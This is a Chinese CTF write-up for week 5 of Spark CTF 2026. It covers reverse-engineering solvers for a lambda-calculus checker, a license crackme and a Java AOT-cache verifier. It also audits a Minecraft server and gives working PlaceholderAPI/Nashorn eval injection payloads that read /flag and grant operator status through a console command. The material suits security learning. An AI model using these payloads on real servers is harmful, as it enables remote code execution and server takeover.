---
title: "Spark CTF 2026 Writeup (5/5) - Week 5"
description: "Spark 新生赛 Writeup 第五部分（Week 5），Reverse 方向以及 MC（Minecraft 插件审计）题目的分析与利用。"
published: 2026-11-11T06:00:00+08:00
category: CTF
tags: [Spark CTF 2026, AST, Java 逆向, JVM 逆向, AOT 缓存, 软件破解, Minecraft, PlaceholderAPI, 插件审计, NodeJS 代码执行]
pinned: false
draft: false
image: https://img.halfcity.top/2026/11/11/44929c2f59dbfa428a2bc7d24bbdd26c.avif
---

## Reverse

### 匿名M

main 函数如下：

![](https://img.halfcity.top/2026/11/11/c08d7aee03c8b301db508f8728d7bc61.avif)

这里似乎和之前的函数不太一样，仔细一看似乎原本很多被拆分成多个函数的地方在这被 inline 了。

简单重命名一下，可以看到函数前面的内容还是和之前一样获取输入并检测内容是否合理：

![](https://img.halfcity.top/2026/11/11/4053e9373746e7f32b38dda4338b16e7.avif)

随后就看到了一堆很抽象的东西，里面有大量的递归调用，一问才知道是 AST。

![](https://img.halfcity.top/2026/11/11/46cdf16264eb2e64ba35cdab517d219c.avif)

分析如下：

```c
if ( is_procable ) {
    for ( i = 0; i < nx17; ++i )                    // nx17 = 0x17 = 23
        if ( s1[i + 5] <= 0x1Fu || s1[i + 5] > 0x7Eu )
            is_procable = 0;                        // 23 个有效字符必须可打印
}

if ( is_procable ) {
    argva = 0;
    v26 = &unk_402028;                              // 59B 程序字节码起点
    nx3B_1 = nx3B;                                  // 0x3B = 59
    nx3B_2 = 0;
    v23 = parse(&v26, 0, &argva);                   // 字节码 → AST
    if ( nx3B_2 != nx3B_1 ) fail();                 // 必须正好解析 59 字节

    v24 = evaluate(v23, 0, &argva);                 // AST → 闭包（λ 项函数）

    v13 = 0;
    for ( j = 0; j < nx17; ++j ) {                  // 遍历 23 个用户字符
        argv_ = 0;
        v8  = church(s1[j + 5], &argv_);            // 用户字符 → Church 数
        v25 = apply(v24, v8, &argv_);               // 把 v24 应用到 Church 数
        v18 = unchurch(v25, &argv_);                // 结果 Church 数 → 整数
        v13 |= v18 != u16(2*j + nx3B + 4202536);    // 与 .rodata 中密文比较
        release(&argv_);
    }
    release(&argva);

    Wrong = v13 ? "Wrong" : "Correct";
    puts(Wrong);
    return v13 != 0;
}
```



#### `parse`：字节码 → 语法树

![](https://img.halfcity.top/2026/11/11/6fbf0f90f46f8ee6baf26aa0f9fb81ff.avif)

```
tag 0x00 idx  → 变量（de Bruijn 索引 idx）
tag 0x01      → lambda，递归解析一个 body
tag 0x02      → application，递归解析两个子项
```

对应的内部节点是：

```c
node(type, a, b, c, d)   // 具体字段名按题意
// 0 → 变量，第二个参数存 idx
// 1 → λ，第三个参数存 body
// 2 → app，第三、四个参数存左、右子项
```

#### `evaluate`：在环境 `env` 下求值

![](https://img.halfcity.top/2026/11/11/1031f526fe5e8e0c03d91b6fc2ee1557.avif)

大致逻辑如下：

```c
evaluate(a1, a2, argv):
    switch (ast->type):
        case 0 (Var):   沿 env 走 idx 步取绑定值         // 变量 → 值
        case 1 (Lam):   返回闭包 {body, env}             // λ   → 闭包（不再执行 body）
        case 2 (App):   f = evaluate(left,  env)
                        x = evaluate(right, env)
                        return apply(f, x)               // 交棒给 apply 完成调用
```

- `tag 0`：沿环境链表走 `idx` 步取绑定值
- `tag 1`：构造闭包 `{type=0, body=child, env=当前env}`
- `tag 2`：分别求值左右子项，再 `apply(f, x)`

#### `apply`：函数应用

![](https://img.halfcity.top/2026/11/11/0f981c242dd2a8e78a74c92593d97cc4.avif)

- 如果 `f` 是闭包：把 `x` 压入环境，继续 `evaluate(body, new_env)`
- 否则：要求 `f` 是 `tag=1` 的"后继"节点、`x` 是 `tag=2` 的数字节点，返回 `x.num + 1`

这里是最后应用 evaluate 返回的闭包函数的地方。 

#### `.rodata` 数据布局

```
word_402024 = 0x17 = 23      → 后面密文的数量
word_402026 = 0x3B = 59      → 前面程序字节码的长度
unk_402028[0 : 59]           → 程序字节码
unk_402028[59 : 59+46]       → 23 个小端 u16 密文
```

把 59 字节程序解析出来（脚本 `parser` 部分会打印），可以看到：

- 出现过 `λp λq. p(p(p q))` → **Church 数 3**
- 出现过 `λt λz. t(t(t z))` → **Church 数 3**

即程序本身就是一段用 λ 演算写的"Church 3 生成器"，是一种**提示**——真正要用的 key 就是 3。

观察 23 个密文 word：

```
8B E1 C1 ED C1 DB 63 EF CD C1 DB C5 DD C7 CB C5 CB C5 CB C5 81 81 81
```

**全部是奇数**。这强烈暗示加密是仿射变换：

```
c = a·p + b,  a 与 b 奇偶性相反才能保证 c 奇数 → 常见取值 a=2, b=奇数
```

- 如果 `a=2, b=3`，则 `p = (c - 3)/2`，把明文限制在可打印 ASCII（32~126），只有 `b=3` 能满足全部 23 个字符都在可打印范围内。
- 同时程序里出现了两次 Church 3（`λpλq.p(p(p q))` 和 `λtλz.t(t(t z))`），互相印证 `key = 3`。

所以解密式就是：

```
p = (c - 3) // 2
```

解密脚本如下：

```py
data = bytes([
    0x02, 0x01, 0x02, 0x01, 0x02, 0x01, 0x01, 0x02,
    0x02, 0x00, 0x02, 0x02, 0x00, 0x03, 0x00, 0x00,
    0x00, 0x01, 0x01, 0x01, 0x02, 0x00, 0x01, 0x02,
    0x00, 0x01, 0x02, 0x00, 0x01, 0x00, 0x00, 0x01,
    0x01, 0x02, 0x00, 0x01, 0x02, 0x00, 0x01, 0x00,
    0x00, 0x01, 0x01, 0x01, 0x01, 0x02, 0x02, 0x00,
    0x03, 0x00, 0x01, 0x02, 0x02, 0x00, 0x02, 0x00,
    0x01, 0x00, 0x00,

    0x8B, 0x00, 0xE1, 0x00, 0xC1, 0x00, 0xED, 0x00,
    0xC1, 0x00, 0xDB, 0x00, 0x63, 0x00, 0xEF, 0x00,
    0xCD, 0x00, 0xC1, 0x00, 0xDB, 0x00, 0xC5, 0x00,
    0xDD, 0x00, 0xC7, 0x00, 0xCB, 0x00, 0xC5, 0x00,
    0xCB, 0x00, 0xC5, 0x00, 0xCB, 0x00, 0xC5, 0x00,
    0x81, 0x00, 0x81, 0x00, 0x81, 0x00,
])

CODE_LEN = 0x3B
CIPHER_N = 0x17

pos = 0
def parse(depth=0):
    global pos
    t = data[pos]; pos += 1
    if t == 0x00:                                  # 变量
        idx = data[pos]; pos += 1
        assert idx < depth, f"bad var idx={idx}, depth={depth}"
        return ('var', idx)
    elif t == 0x01:                                # λ
        body = parse(depth + 1)
        return ('lam', body)
    elif t == 0x02:                                # app
        f = parse(depth)
        a = parse(depth)
        return ('app', f, a)
    else:
        raise ValueError(f"bad opcode {t} at {pos-1}")

prog = parse()
assert pos == CODE_LEN, f"parse ended at {pos}, expected {CODE_LEN}"
print("[*] length =", pos)

def show(n, ind=0):
    pad = '  ' * ind
    if n[0] == 'var':
        return f"{pad}var#{n[1]}"
    if n[0] == 'lam':
        return f"{pad}λ.(\n{show(n[1], ind+1)}\n{pad})"
    if n[0] == 'app':
        return f"{pad}app(\n{show(n[1], ind+1)}\n{show(n[2], ind+1)}\n{pad})"

print("\n[*] AST:")
print(show(prog))

cipher = []
for i in range(CIPHER_N):
    lo = data[CODE_LEN + i*2]
    hi = data[CODE_LEN + i*2 + 1]
    cipher.append(lo | (hi << 8))
print("\n[*] cipher =", [hex(c) for c in cipher])

# 爆破 key（1~255 的奇数），要求所有明文都是可打印 ASCII
print("\n[*] 爆破 key:")
solutions = []
for k in range(1, 256, 2):
    s = []
    ok = True
    for c in cipher:
        d = c - k
        if d % 2 != 0:          # 保证可整除
            ok = False; break
        p = d // 2
        if not (32 <= p < 127): # 可打印 ASCII
            ok = False; break
        s.append(chr(p))
    if ok:
        text = ''.join(s)
        solutions.append((k, text))
        print(f"    key = {k:3d} (0x{k:02x}) → {text}")


text = next((k, t) for k, t in solutions if k == 3)[1]

print("FLAG = flag{" + text + "}")

```

输出如下：

```
> python solve.py
[*] length = 59

[*] AST:
app(
  λ.(
    app(
      λ.(
        app(
          λ.(
            λ.(
              app(
                app(
                  var#2
                  app(
                    var#3
                    var#0
                  )
                )
                var#1
              )
            )
          )
          λ.(
            λ.(
              app(
                var#1
                app(
                  var#1
                  app(
                    var#1
                    var#0
                  )
                )
              )
            )
          )
        )
      )
      λ.(
        λ.(
          app(
            var#1
            app(
              var#1
              var#0
            )
          )
        )
      )
    )
  )
  λ.(
    λ.(
      λ.(
        λ.(
          app(
            app(
              var#3
              var#1
            )
            app(
              app(
                var#2
                var#1
              )
              var#0
            )
          )
        )
      )
    )
  )
)

[*] cipher = ['0x8b', '0xe1', '0xc1', '0xed', '0xc1', '0xdb', '0x63', '0xef', '0xcd', '0xc1', '0xdb', '0xc5', '0xdd', '0xc7', '0xcb', '0xc5', '0xcb', '0xc5', '0xcb', '0xc5', '0x81', '0x81', '0x81']

[*] 爆破 key:
    key =   1 (0x01) → Ep`v`m1wf`mbncebebeb@@@
    key =   3 (0x03) → Do_u_l0ve_lambdadada???
    key =   5 (0x05) → Cn^t^k/ud^k`lac`c`c`>>>
    key =   7 (0x07) → Bm]s]j.tc]j_k`b_b_b_===
    key =   9 (0x09) → Al\r\i-sb\i^j_a^a^a^<<<
    key =  11 (0x0b) → @k[q[h,ra[h]i^`]`]`];;;
    key =  13 (0x0d) → ?jZpZg+q`Zg\h]_\_\_\:::
    key =  15 (0x0f) → >iYoYf*p_Yf[g\^[^[^[999
    key =  17 (0x11) → =hXnXe)o^XeZf[]Z]Z]Z888
    key =  19 (0x13) → <gWmWd(n]WdYeZ\Y\Y\Y777
    key =  21 (0x15) → ;fVlVc'm\VcXdY[X[X[X666
    key =  23 (0x17) → :eUkUb&l[UbWcXZWZWZW555
    key =  25 (0x19) → 9dTjTa%kZTaVbWYVYVYV444
    key =  27 (0x1b) → 8cSiS`$jYS`UaVXUXUXU333
    key =  29 (0x1d) → 7bRhR_#iXR_T`UWTWTWT222
    key =  31 (0x1f) → 6aQgQ^"hWQ^S_TVSVSVS111
    key =  33 (0x21) → 5`PfP]!gVP]R^SURURUR000
    key =  35 (0x23) → 4_OeO\ fUO\Q]RTQTQTQ///
FLAG = flag{Do_u_l0ve_lambdadada???}
```

```txt
flag{Do_u_l0ve_lambdadada???}
```

### license

![](https://img.halfcity.top/2026/11/11/d16a3ab341f0121e5b4520286882f847.avif)

观察程序的逻辑，这似乎是一个破解的动态题。

先简单答题恢复一下程序的逻辑，随后我们分开讲解：

![](https://img.halfcity.top/2026/11/11/08010ed44213242753b9fe486e81b7a0.avif)

这里我们往后看看可以看到 `s_license` 似乎是会参与后续的解密逻辑的，这样我们就不应该一路 patch 下去了，我们需要正经分析一下。

`sub_401CE6` 是 input 函数，获取输入，其中 `sub_4013CB` 会对 Account 校验：

```c
__int64 __fastcall sub_4013CB(const char *s1)
{
  unsigned __int64 i; // [rsp+18h] [rbp-8h]

  if ( strlen(s: s1) != 12 )
    return 0;
  for ( i = 0; i <= 0xB; ++i )
  {
    if ( (unsigned __int8)sub_401396((unsigned __int8)((7 * i + 90) ^ s1[i]), 3) != *(_BYTE *)(i + 4206913) )
      return 0;
  }
  return 1;
}
```

一个8位循环左移加密，其中 `*(_BYTE *)(i + 4206913)` 这里似乎利用局部变量来对全局变量进行了访问。

解密脚本如下：

```py
byte_403141 = [
    0x70, 0x70, 0x88, 0x70, 0xD8, 0xE0,
    0x7E, 0x57, 0x0F, 0x67, 0x6E, 0x76,
]

def ror8(v, n):
    v &= 0xFF
    return ((v >> n) | (v << (8 - n))) & 0xFF

account = ''.join(
    chr(ror8(byte_403141[i], 3) ^ ((7 * i + 90) & 0xFF))
    for i in range(12)
)
print("account =", account)
```

输出如下：

```txt
> python tell_me_ur_name.py
account = ToyamaKasumi
```

随后 Account 被传入 `sub_40145D` 生成 key：

![](https://img.halfcity.top/2026/11/11/0cd00e6146e1e5c209bfa19d36bb91cd.avif)

这里的加密并不难，但是我们有更简单的方式就是直接看返回值所以就不必写 keygen 了：

![](https://img.halfcity.top/2026/11/11/7f6cc11d424a36f32f0c0f0c1de62d95.avif)

![](https://img.halfcity.top/2026/11/11/0aa2d58a2b3bb9135609a950f4f682f2.avif)

![](https://img.halfcity.top/2026/11/11/d192625d76342db728a45fe650a69c14.avif)

```txt
C325-67C4-C8BA-CD0E
```

```txt
❯ ./license
Four Layers / Rookie License Desk
Account: ToyamaKasumi
License: C325-67C4-C8BA-CD0E
flag{static_analysis_is_all_you_need}
```

这里似乎解出了一个假的 flag。

![](https://img.halfcity.top/2026/11/11/a7f36e923900305626979a94dc7a7a8b.avif)

![](https://img.halfcity.top/2026/11/11/b2e901dd7c7e9d26453ae12aaf979bb0.avif)

注意这里 ptrace 的检测结果似乎对于选择的密文发生影响。

我们可以测试一下如果处于 debug 状态输出会怎么样：

![](https://img.halfcity.top/2026/11/11/80da0de17e3358543cd25f998f0c167d.avif)

可以看到这里出题人搞了个小巧思：

```txt
flag{lic3Nse_can_be_Reee!}
```

### 幽灵法则

#### 静态类

题目给了一个 jar 包和 jvm，我们先简单看看 jar包：

![](https://img.halfcity.top/2026/11/11/56c624f5434097cae9266b056f377d30.avif)

![](https://img.halfcity.top/2026/11/11/23d3544fc27d53987244d53f4e68e0b4.avif)

```java
package defpackage;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

/* JADX INFO: loaded from: ghost-rule.jar:Main.class */
public final class Main {
    public static void main(String[] strArr) throws Exception {
        if (strArr.length == 1 && strArr[0].equals("--train")) {
            Class.forName("Verifier");
            return;
        }
        System.out.println("ghost rule / 幽灵法则");
        System.out.print("flag> ");
        System.out.flush();
        String line = new BufferedReader(new InputStreamReader(System.in, StandardCharsets.UTF_8)).readLine();
        System.out.println(line != null && line.startsWith("flag{") && line.endsWith("}") && line.length() == 38 && Verifier.verifyStuff(line.substring(5, 37).getBytes(StandardCharsets.UTF_8)) ? "Accepted." : "Rejected.");
    }
}
```

校验逻辑异常简单，没有任何的弯子。

这里对 32 字节输入逐字节做一个可逆的链式变换，然后与 `iArr` 的低 8 位比较。因为变换可逆，所以可以直接反推出每个位置的原始字节。

1. 输入必须是 32 字节，对应 `flag{...}` 中间部分。

2. `i` 是固定初始值 `9320` 的 xorshift 伪随机序列，每轮先更新。

3. 每轮取输入字节的下标为：

   ```java
   ((i3 * 11) + 9) & 31
   ```

   这是一个 0~31 的排列。

4. 每轮实际比较的是：

   ```java
   i8 = rotl8(i6, i7) ^ i2
   ```

   其中：

   ```java
   i6 = ((((b[idx] & 255) ^ (i & 255)) * 173) + 47) & 255
   i7 = ((i >>> 8) & 7) + 1
   ```

5. `173` 在模 256 下的逆元是 `37`，因为：

   ```text
   173 * 37 ≡ 1 mod 256
   ```

   所以可从 `i6` 反推：

   ```java
   x = ((i6 - 47) * 37) & 255
   b[idx] = x ^ (i & 255)
   ```

6. `i2` 初始为 `211`，之后每轮更新为上一轮的比较值 `iArr[i3] & 255`。

解密脚本如下：

```py
iArr = [
    27603, 27615, 27533, 27574, 27444, 27434, 27596, 27500,
    27557, 27519, 27547, 27420, 27473, 27395, 27595, 27475,
    27641, 27459, 27595, 27647, 27562, 27392, 27533, 27412,
    27604, 27431, 27465, 27413, 27626, 27410, 27421, 27535
]

MASK = 0xffffffff

def rotl8(v, r):
    v &= 0xff
    return ((v << r) | (v >> (8 - r))) & 0xff

def rotr8(v, r):
    v &= 0xff
    return ((v >> r) | (v << (8 - r))) & 0xff

i = 9320
prev = 211
b = bytearray(32)

for t in range(32):
    # Java int 的 32 位 xorshift
    i4 = (i ^ (i << 11)) & MASK
    i5 = (i4 ^ (i4 >> 19)) & MASK
    i = (i5 ^ (i5 << 9)) & MASK

    idx = ((t * 11) + 9) & 31
    r = ((i >> 8) & 7) + 1

    target = iArr[t] & 0xff

    # target = rotl8(i6, r) ^ prev
    rot = target ^ prev
    i6 = rotr8(rot, r)

    # i6 = ((((b[idx] ^ (i & 255)) * 173) + 47) & 255)
    x = (((i6 - 47) * 37) & 0xff)
    b[idx] = x ^ (i & 0xff)

    prev = target

content = bytes(b).decode()
print("flag{" + content + "}")
```

输出如下：

```txt
> python trust_light.py
flag{jar_says_yes_but_cache_says_no!!}
```

观察这个 flag 就能看出来这个 flag 很明显是假的，也理应如此，这里给了我们一个提示，jar 包是对的但是 cache 是错的。

所以实际在 cache 中运行的 jar 包和我们手上静态的 jar 包应该是不一致的。

我们需要做的是从内存中 dump 出真实的 jar 包然后对他进行分析。

#### 缓存类

先将程序跑起来：

![](https://img.halfcity.top/2026/11/11/12a2c670ed67d7749011f8a014bf97ad.avif)

然后我们使用 jhsdb 连接到这个程序。

注意这里的大版本最好要匹配并且要先关闭版本检查：

```txt
❯ export JAVA_TOOL_OPTIONS="-Dsun.jvm.hotspot.runtime.VM.disableVersionCheck"
```

![](https://img.halfcity.top/2026/11/11/be99a18a8aebf2f8b0013279e36a5716.avif)

![](https://img.halfcity.top/2026/11/11/fe94f857583701fdb8965eed45a7b497.avif)

![](https://img.halfcity.top/2026/11/11/4a32deb775eea05408a68b2b3aeb8d91.avif)

随后可以拉到主机分析了：

![](https://img.halfcity.top/2026/11/11/496100449bd8414172677fa88ebb2fc5.avif)

```java
package defpackage;

/* JADX INFO: loaded from: Verifier.class */
public final class Verifier {
    public static boolean verifyStuff(byte[] bArr) {
        if (bArr.length != 32) {
            return false;
        }
        int[] iArr = {27571, 27643, 27422, 27471, 27609, 27608, 27547, 27566, 27480, 27407, 27464, 27499, 27546, 27480, 27558, 27623, 27527, 27636, 27420, 27531, 27620, 27423, 27520, 27631, 27640, 27543, 27502, 27584, 27537, 27416, 27479, 27565};
        int i = 4919;
        int i2 = 167;
        for (int i3 = 0; i3 < 32; i3++) {
            int i4 = i ^ (i << 13);
            int i5 = i4 ^ (i4 >>> 17);
            i = i5 ^ (i5 << 7);
            int i6 = ((((bArr[((i3 * 13) + 7) & 31] & 255) ^ (i & 255)) * 197) + 101) & 255;
            int i7 = ((i >>> 8) & 7) + 1;
            int i8 = (((i6 << i7) | (i6 >>> (8 - i7))) & 255) ^ i2;
            if (i8 != (iArr[i3] & 255)) {
                return false;
            }
            i2 = i8;
        }
        return true;
    }
}
```

这里几乎将之前的参数全部换了一遍：

- `iArr` 换成了新数组
- `i` 初始值从 `9320` 变为 `4919`
- `i2` 初始值从 `211` 变为 `167`
- xorshift 参数变为 `13 / 17 / 7`
- 仿射变换乘数从 `173` 变为 `197`，加数从 `47` 变为 `101`
- 索引变换从 `(i3*11+9)&31` 变为 `(i3*13+7)&31`

修改后的解密脚本如下：

```py
iArr = [
    27571, 27643, 27422, 27471, 27609, 27608, 27547, 27566,
    27480, 27407, 27464, 27499, 27546, 27480, 27558, 27623,
    27527, 27636, 27420, 27531, 27620, 27423, 27520, 27631,
    27640, 27543, 27502, 27584, 27537, 27416, 27479, 27565
]

MASK = 0xffffffff

def rotl8(v, r):
    v &= 0xff
    return ((v << r) | (v >> (8 - r))) & 0xff

def rotr8(v, r):
    v &= 0xff
    return ((v >> r) | (v << (8 - r))) & 0xff

i = 4919
prev = 167
b = bytearray(32)

for t in range(32):
    # Java int 32 位 xorshift: i ^= i << 13; i ^= i >>> 17; i ^= i << 7
    i4 = (i ^ (i << 13)) & MASK
    i5 = (i4 ^ ((i4 & MASK) >> 17)) & MASK
    i = (i5 ^ (i5 << 7)) & MASK

    idx = ((t * 13) + 7) & 31
    r = ((i >> 8) & 7) + 1

    target = iArr[t] & 0xff

    # target = rotl8(i6, r) ^ prev
    rot = target ^ prev
    i6 = rotr8(rot, r)

    # i6 = ((((b[idx] ^ (i & 255)) * 197) + 101) & 255)
    # 197 的逆元是 13
    x = (((i6 - 101) & 0xff) * 13) & 0xff
    b[idx] = x ^ (i & 0xff)

    prev = target

content = bytes(b).decode()
print("flag{" + content + "}")
```

输出如下：

```txt
> python true_way.py
flag{cache_keeps_the_real_bytecode!!!}
```

```txt
flag{cache_keeps_the_real_bytecode!!!}
```

## MC

写作 MC 读作审计

题目的名字叫 `TrChat`，说的可能就是这个 MC 插件了

![](https://img.halfcity.top/2026/11/11/9987ae9518a27d4f3df148b856e03ec1.avif)

我们检查一下其他的插件有没有问题：

![](https://img.halfcity.top/2026/11/11/5b266f31078ff2b6e8a3e3159a077a4c.avif)

![](https://img.halfcity.top/2026/11/11/319c69571ca0b918f30aad28a797723a.avif)

这里确认了这个 `PlaceholderAPI` 的插件的 js 扩展可能导致我们执行任意的 nodejs 环境下的 js 代码。

我们看看它的定义文件。

### 审计

`javascript_placeholders.yaml`:

```yaml
# Javascript Expansion: @VERSION@
# This is the main configuration file for the Javascript Expansion.
# 
# You will define your javascript placeholders in this file.
# 
# Javascript files must be located in the:
#  /plugins/placeholderapi/javascripts/ folder
# 
# A detailed guide on how to create your own javascript placeholders
# can be found here:
# https://github.com/PlaceholderAPI-Expansions/Javascript-Expansion/wiki
# 
# Your javascript placeholders will be identified by: %javascript_<identifier>%
# 
# Configuration format:
# 
# <identifier>:
#   file: <name of file>.<file extension>
# 
# Example:
# 
# 'my_placeholder':
#   file: 'my_placeholder.js'
calc:
  file: calc.js
example:
  file: example.js

```

`calc.js` ：

```js
// 配置里写算式用的占位符，变量从 Player 绑定取
lvl = Player.getLevel();
hp = Player.getHealth();
ping = Player.getPing();
eval(args[0]);

```

这里的 calc 做了一个非常危险的操作，它没有任何过滤直接将 arg 传入了 eval 函数。

- `eval(args[0])`。
  - `args[0]` 是占位符传入的第一个参数。
  - `eval` 会把这段字符串当 **完整 JavaScript 代码执行**，不是当算式解析。
  - 在 Nashorn 中，脚本通常可以访问 Java 类，例如通过 `Java.type(...)`、反射等。也就是说，如果能控制 `args[0]`，就可能执行任意 Java 方法。
  - 即使有某些 ClassFilter 限制，`eval` 仍然有可能可以执行。

而 `calc.js` 注册成了全局可用的 PAPI 占位符，这意味着任何能解析 PlaceholderAPI 的地方，都可以通过 `%javascript_calc_<参数>%` 调用 `calc.js`

所以现在我们需要找到一个地方会解析 PAPI 的地方，随后我们就可以尝试调用这里的 eval 来实现 RCE。

![](https://img.halfcity.top/2026/11/11/e5565883b3714d668b3bbbfbc7ab882f.avif)

之前发现的 TrChat 的修复似乎都是对这些 yaml 的修复我们一个个去看看。

这里注意到这个文件，在 `function.yaml` 文件中：

```yaml
General:
  Command-Controller:
    Enabled: true
    List:
      - 'arasple{exact: true}{condition: perm *trchat.admin}'
      - 'ver(sion)?(s)?{condition: perm *trchat.admin}'
      - 'help(s)?{condition: perm *trchat.admin}'
      - 'shout{cooldown: 3}'
  Mention:
    Enabled: true
    Self-Mention: false
    Permission: 'none'
    Cooldown: '30s'
    Notify: true
    Actions: [ ]
  Mention-All:
    Enabled: true
    Permission: 'trchat.function.mentionall'
    Cooldown: '5m'
    Notify: true
    Keys:
      - "@all"
      - "@everyone"
      - "@everybody"
      - "@所有人"
      - "@全体成员"
    Actions: [ ]
  Item-Show:
    Enabled: true
    Permission: 'none'
    Cooldown: '30s'
    Origin-Name: false
    Compatible: false
    Type: TRANSLATABLE
    Keys:
      - "%i%"
      - "%i"
      - "%item%"
      - "%item"
      - "[i]"
      - "[item]"
    Actions: [ ]
  Inventory-Show:
    Enabled: true
    Permission: 'trchat.function.inventoryshow'
    Cooldown: '30s'
    Keys:
      - '[inv]'
      - '[inventory]'
    Actions: [ ]
  EnderChest-Show:
    Enabled: true
    Permission: 'trchat.function.enderchestshow'
    Cooldown: '30s'
    Keys:
      - '[ender]'
      - '[enderchest]'
    Actions: [ ]
  Image-Show:
    Enabled: true
    Permission: 'trchat.function.imageshow'
    Cooldown: '1m'
    Key: '!\[([^;]*)\]\(([a-zA-Z]+://[^\s]*)\)'
    Actions: [ ]

Custom:
  # 示例 —— 网站分享
  shareUrl:
    pattern: '((https|http|ftp|rtsp|mms)?:\/\/)[^\s]+'
    display:
      text: '&8[&f&l网站&8]'
      hover:
        - ''
        - '&3网站: {0}'
        - ''
        - '&7点击进入!'
        - ''
        - '&8[&c!&8] &7谨防任何诈骗'
      url: '{0}'

```

注意到这里：

```yaml
  shareUrl:
    pattern: '((https|http|ftp|rtsp|mms)?:\/\/)[^\s]+'
    display:
      text: '&8[&f&l网站&8]'
      hover:
        - ''
        - '&3网站: {0}'
        - ''
        - '&7点击进入!'
        - ''
        - '&8[&c!&8] &7谨防任何诈骗'
      url: '{0}'
```

由于 PAPI 在这里被安装，所以这里会正则匹配协议头并将后面的参数通过 PAPI 解析。

所以这里的参数部分可能就可以调用 calc 来实现任意 js 执行。

我们可以测试一下：

```txt
http://example.com/%javascript_calc_1+1%
```

![](https://img.halfcity.top/2026/11/11/cfbc361f2dd040dc518566b7ed58d5e5.avif)

可以看到这里成功调用 PAPI 解析了。

尝试如下 payload 检查 `Java.Type()` 的可用性：

```txt
http://example.com/%javascript_calc_Java.type('java.lang.System').getProperty('java.version')%
```

但是返回如下：

![](https://img.halfcity.top/2026/11/11/083b3af7c46f757bf19e2625278664d3.avif)

调用如下 payload 尝试检查 engine 是否可用：

```txt
http://example.com/%javascript_calc_this.engine!=null%
```

![](https://img.halfcity.top/2026/11/11/abc1a3f969a2816d1c1617ada5ba1f6a.avif)

可以看到，是可以使用的。

那么我们可以尝试直接调用脚本引擎执行 `Files.readAllLines()`，来尝试读取 flag。

```txt
http://example.com/%javascript_calc_this.engine.factory.scriptEngine.eval('java.nio.file.Files.readAllLines(java.nio.file.Paths.get("/flag"))')%
```

![](https://img.halfcity.top/2026/11/11/cd0ef8e8754c1b5ef41b3a466125b9ba.avif)

可以看到这里没有被 `ClassFilter` 拦截，并得到了最后的 flag：

```txt
flag{pl4ceh0lder_pwn3d_by_ch4t}
```

### 彩蛋

这里由于加载了Bukkit 插件，所以这里的 Player 就是 `org.bukkit.entity.Player` 的实例，因此我们可以直接调用 getter 来访问控制台。

直接给予我们 op 权限，这里由于是 URL 所以会经历一次 URL 解码的过程，所欲可以使用 `%20` 编码来绕过空格。

payload：

```txt
http://example.com/%javascript_calc_Player.getServer().dispatchCommand(Player.getServer().getConsoleSender(),"op%20halfcity")%
```

这样我们就获取到 OP 了：

![](https://img.halfcity.top/2026/11/11/d8ed2c79ee59db8d339e9e770a7d8b91.avif)

